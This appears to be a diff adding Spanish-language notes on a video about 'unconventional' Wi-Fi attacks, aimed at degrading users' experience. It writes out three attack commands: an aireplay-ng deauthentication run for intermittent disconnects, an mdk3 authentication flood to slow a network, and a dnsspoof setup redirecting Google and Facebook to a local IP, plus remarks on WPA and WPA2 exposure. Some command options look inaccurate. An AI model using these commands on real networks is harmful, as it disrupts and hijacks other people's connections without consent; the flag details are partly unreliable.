@@ -1295,3 +1295,31 @@ Este video explora técnicas de ataques no convencionales que, aunque pueden par
 - Demuestra cómo pequeñas modificaciones en los ataques pueden tener efectos notables en la experiencia del usuario
 
 ### Técnicas presentadas:
+
+#### 1. Ataque de desconexión intermitente
+```bash
+aireplay-ng --deauth 1 -a [MAC_AP] wlan0mon --interval 30
+```
+Este comando envía paquetes de desautenticación cada 30 segundos, causando desconexiones intermitentes que son difíciles de diagnosticar para el usuario.
+
+#### 2. Ataque de ralentización de red
+```bash
+mdk3 wlan0mon a -a [MAC_AP] -m
+```
+Este ataque inunda la red con paquetes de autenticación malformados, causando una degradación gradual del rendimiento sin desconectar completamente a los usuarios.
+
+#### 3. Ataque de confusión de DNS
+```bash
+dnsspoof -i wlan0mon -f hosts.txt
+```
+Donde hosts.txt contiene redirecciones humorísticas como:
+```
+192.168.1.100 www.google.com
+192.168.1.100 www.facebook.com
+```
+- donde todas las solicitudes DNS hacia Google o Facebook se redirige al ip anterior.
+### Aplicabilidad por versiones:
+- **WPA**: Altamente vulnerable a estos ataques debido a su implementación menos robusta de la gestión de paquetes
+- **WPA2**: Vulnerable a la mayoría de estos ataques, aunque algunas implementaciones más recientes pueden detectar patrones de desautenticación sospechosos
+- **WPA2-Enterprise**: Menos vulnerable a algunos de estos ataques debido a la autenticación basada en 802.1X, pero sigue siendo susceptible a ataques de desautenticación
+
